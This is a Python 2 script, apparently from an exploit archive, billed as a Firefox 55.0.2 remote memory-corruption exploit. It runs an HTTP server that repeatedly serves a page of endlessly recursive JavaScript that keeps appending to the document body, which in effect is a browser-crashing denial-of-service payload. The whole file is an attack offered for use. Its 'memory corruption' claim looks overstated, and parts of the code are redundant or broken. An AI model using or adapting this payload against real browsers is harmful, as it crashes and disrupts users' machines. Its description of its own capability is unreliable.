# -*- coding: UTF-8 -*-
#Title: Mozilla Firefox 55.0.2 -firefox 55.2 memory corruption win7/10 remote
#Author: sultan albalawi
#Tested on:win7/10
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import subprocess,string,struct
from struct import pack
host='127.0.0.1'# u-ip
port=6060
ban="""
FireFox 55.02 Memory Corruption Exploit
By: Sultan Albalawi 
"""
print ban
print "please wait ...."
try:
    for ss in xrange(2000):
        ss1="\0\1\2\3\4\5\6\7\001\007\004\005\006\002\01\02\06\03\07"*ss
        ss2=("\x20\x20\x20\x20\x20\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x65\x28\x54\x29\n"+
             "\x20\x20\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x65\x28\x54\x29\n"+
             "\x20\x20\x20\x20\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x65\x28\x54\x29\n"+
             "\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x65\x28\x54\x29\n\x7b\n"+
             "\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x62\x6f\x64\x79\x2e\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c\x20\x2b\x3d\x20\x54\x3b\n"+
             "\x65\x28\x54\x20\x2b\x20\x27\x54\x27\x29\x3b\n"+
             "\x7d\x3b\n"+
             "\x65\x28\x27\x54\x27\x29")



        paylo='''
         function e(x)
{
  document.body.innerHTML += x;
  e(x + 'x');
};

e('x')

         '''

        #javas='\t\t\talert'+'('+du+ss1+du+')'+';'''+'\n'
        ss2=(
            "<html>\n"+
            "<title>"+"s"+"</title>\n"+
            "<body>\n"+
            "<script>\n"+
            paylo*10000+
            "</script>\n"+
            "</body>\n"+
            "</html>")

    class Req(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            for sss in range(5000):
              self.wfile.write(ss2)


    class runHTTP(HTTPServer):
        def __init__(self,host,port):
            ipadd=(host,port)
            HTTPServer.__init__(self,ipadd,Req)
    def createfile():
        global filecreate
        filecreate = "Firefox.html"
        open(filecreate, "w").write(ss1)
        print filecreate
    createfile()
    def start():
        global filecreate
        ser=runHTTP(host,port)
        print "http://{}:{}/{}".format(host,port,filecreate)
        ser.serve_forever()
    start()
except Exception ,R:
    print R